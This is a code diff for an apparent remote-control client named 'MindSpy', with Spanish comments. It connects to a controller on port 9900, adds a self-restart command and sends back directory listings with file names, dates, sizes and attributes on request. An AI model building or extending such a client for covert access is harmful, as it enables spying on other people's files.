@@ -18,12 +18,13 @@ namespace MindSpy
 		string sDirTemp = inet_ntoa(*DirTemp);
 		// Crear un nuevo socket para el servidor donde se asigna IP, protocolo y puerto
 		sckt = socket(AF_INET, SOCK_STREAM, 0);
-		server.sin_addr.s_addr = inet_addr(sDirTemp.c_str());
-		//server.sin_addr.s_addr = inet_addr("127.0.0.1");
+		//server.sin_addr.s_addr = inet_addr(sDirTemp.c_str());
+		server.sin_addr.s_addr = inet_addr("127.0.0.1");
 		server.sin_family = AF_INET;
 		server.sin_port = htons(9900);
 		// Conectar al socket
 		Conectado = connect(sckt, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR;
+		if (!Conectado) return;
 		// Iniciar el hilo de escucha
 		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiloProc, (LPVOID)this, NULL, NULL);
 		stInitialInfo stii;
@@ -90,24 +91,30 @@ namespace MindSpy
 		{
 			char *szBuff = (char*)malloc(1);
 			DWORD bDisponibles;
-			ioctlsocket(sckt, FIONREAD, &bDisponibles);
+			int res = recv(sckt, (char*)&bDisponibles, 4, MSG_PEEK);
 			// si no los hay, ralentizamos y reiniciamos el ciclo
-			if (!bDisponibles)
+			if (res <= 0 || !bDisponibles)
 			{
-				Sleep(50);
-				continue;
+				closesocket(sckt);
+				Conectado = false;
+				return;	
 			}
 			else
 			{
 				szBuff = (char*)realloc(szBuff, bDisponibles);
-
 			}
 
-			int resp = recv(sckt, szBuff, bDisponibles, 0);
-			if (resp <= 0)
-			{
-				Conectado = false;
-				break;
+			char* actual = szBuff;
+			while (bDisponibles) {
+				res = recv(sckt, actual, bDisponibles, 0);
+				if (res <= 0)
+				{
+					closesocket(sckt);
+					Conectado = false;
+					return;	
+				}
+				bDisponibles -= res;
+				actual += res;
 			}
 
 			UINT32 comando = *(UINT32*)(szBuff + 4);
@@ -123,27 +130,40 @@ namespace MindSpy
 				break;
 
 			case CLNT_CMDS::CLOSE:
-				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
+				closesocket(sckt);
+				Conectado = false;
 				return;
+
+			case CLNT_CMDS::RESTART: {
+				closesocket(sckt);
+				HMODULE hmodule = GetModuleHandle(NULL);
+				char filename[MAX_PATH];
+				GetModuleFileNameA(hmodule, filename, MAX_PATH);
+				ShellExecuteA(NULL, "open", filename, NULL, NULL, SW_SHOWNORMAL);
+				Conectado = false;
+				return;
+			}
 
 			case CLNT_CMDS::FILEINFO: {
 				FileSystem fs;
 				stFileInfoRequest * stfir = (stFileInfoRequest*)(szBuff +8);
 				stListaArchivos stla = fs.getDirContent(stfir->Path, stfir->Filtro, (ContentDir)stfir->Query, NULL);
-				DWORD SizeOfData = (sizeof(WCHAR)*MAX_PATH) + (sizeof(long long) * 3);
-				SizeOfData *= stla.CantArchivos;
+				DWORD SizeOfData = stla.TamNombres + (sizeof(long long) * 3)*stla.CantArchivos  + sizeof(DWORD) * stla.CantArchivos;
 				SizeOfData += sizeof(UINT32);
 				BYTE *DataSend = (BYTE*)VirtualAlloc(NULL, SizeOfData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 				*(UINT32*)(DataSend) = stla.CantArchivos;
 
-				int OffsetWchar = sizeof(WCHAR)*MAX_PATH*stla.CantArchivos;
+				int OffsetWchar = stla.TamNombres;
 				int OffsetLonglong = sizeof(long long) * stla.CantArchivos;
 				int OffsetFiletime = sizeof(FILETIME) * stla.CantArchivos;
+				int OffsetAttributos = sizeof(DWORD) * stla.CantArchivos;
 
 				memcpy(DataSend + sizeof(UINT32), stla.Archivos, OffsetWchar);
 				memcpy(DataSend + sizeof(UINT32) + OffsetWchar, stla.FechasCreacion, OffsetFiletime);
 				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetFiletime, stla.FechasModificacion, OffsetFiletime);
 				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetFiletime*2, stla.Tamaños, OffsetLonglong);
+				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetFiletime*3, stla.Atributos, OffsetAttributos);
+
 				cout << "Enviando FILEINFO, " << SizeOfData << " bytes." << endl;
 				EnviarComando(SizeOfData, CLNT_CMDS::FILEINFO, DataSend);
 				VirtualFree(DataSend, SizeOfData, MEM_RELEASE);
